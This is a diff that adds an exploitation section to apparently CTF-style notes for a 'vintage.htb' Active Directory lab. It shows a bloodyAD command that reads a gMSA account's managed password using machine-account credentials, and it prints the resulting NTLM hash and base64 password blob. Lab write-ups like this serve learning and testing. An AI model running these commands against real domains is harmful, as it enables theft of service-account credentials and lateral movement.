@@ -25,4 +25,18 @@
  1732621230:L.Bianchi_adm
  1733002326:svc_sql
  ```
+## Exploitation
+### BloodyAD
+ * Getting the hash:
+ ```bash
+ bloodyAD --host dc01.vintage.htb -u 'fs01$' -p 'fs01' -d vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword
+ ```
+ * Example
+ ```bash
+ bloodyAD --host dc01.vintage.htb -u 'fs01$' -p 'fs01' -d vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword 
+ distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
+ msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
+ msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
+```
+### [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper)
 
